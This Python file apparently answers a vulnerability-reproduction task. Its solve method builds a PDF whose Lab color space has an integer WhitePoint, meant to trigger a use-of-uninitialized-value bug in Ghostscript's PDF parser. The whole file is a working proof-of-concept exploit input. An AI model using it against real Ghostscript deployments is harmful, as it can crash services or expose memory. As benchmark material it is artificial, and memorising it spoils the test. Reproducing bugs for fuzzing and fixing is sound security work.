import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Uninitialized Value vulnerability in Ghostscript.
        
        The vulnerability (OSS-Fuzz issue 42536068) is a Use-of-Uninitialized-Value in 
        pdfi_cspace_set_lab_params (or similar) caused by ignoring the error code when 
        an attribute conversion (like WhitePoint) fails.
        
        We generate a PDF with a Lab ColorSpace dictionary where the mandatory 'WhitePoint'
        attribute is present but has an invalid type (Integer instead of Array).
        """
        
        # Start constructing the PDF
        pdf = bytearray(b"%PDF-1.7\n%\xE2\xE3\xCF\xD3\n")
        
        # We will track offsets for the xref table
        offsets = []
        
        def add_obj(body: bytes):
            offsets.append(len(pdf))
            obj_id = len(offsets) # 1-based index
            pdf.extend(f"{obj_id} 0 obj\n".encode('ascii'))
            pdf.extend(body)
            pdf.extend(b"\nendobj\n")

        # Object 1: Catalog
        add_obj(b"<< /Type /Catalog /Pages 2 0 R >>")
        
        # Object 2: Pages
        add_obj(b"<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>")
        
        # Object 3: Page
        # Defines the page geometry and resources.
        add_obj(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources 4 0 R /Contents 5 0 R >>")
        
        # Object 4: Resources
        # This contains the trigger. We define a ColorSpace /CS0 of type /Lab.
        # Lab requires a dictionary with a /WhitePoint key containing a 3-element array.
        # We provide an integer '1' instead. The parser attempts to convert/read this attribute.
        # The conversion fails (type mismatch), but if the error is ignored, uninitialized memory
        # allocated for the WhitePoint values is used.
        add_obj(b"<< /ColorSpace << /CS0 [ /Lab << /WhitePoint 1 >> ] >> >>")
        
        # Object 5: Content Stream
        # We must use the color space to trigger the parsing logic.
        # '/CS0 cs' selects the color space.
        # '0 0 0 sc' sets the color values (Lab takes 3 components), forcing the usage of the parameters.
        stream_content = b"q /CS0 cs 0 0 0 sc Q"
        add_obj(f"<< /Length {len(stream_content)} >>\nstream\n".encode('ascii') + stream_content + b"\nendstream")
        
        # Xref Table
        xref_offset = len(pdf)
        pdf.extend(b"xref\n")
        pdf.extend(f"0 {len(offsets) + 1}\n".encode('ascii'))
        pdf.extend(b"0000000000 65535 f \n")
        
        for off in offsets:
            pdf.extend(f"{off:010d} 00000 n \n".encode('ascii'))
            
        # Trailer
        pdf.extend(b"trailer\n")
        pdf.extend(f"<< /Size {len(offsets) + 1} /Root 1 0 R >>\n".encode('ascii'))
        pdf.extend(b"startxref\n")
        pdf.extend(f"{xref_offset}\n".encode('ascii'))
        pdf.extend(b"%%EOF\n")
        
        return bytes(pdf)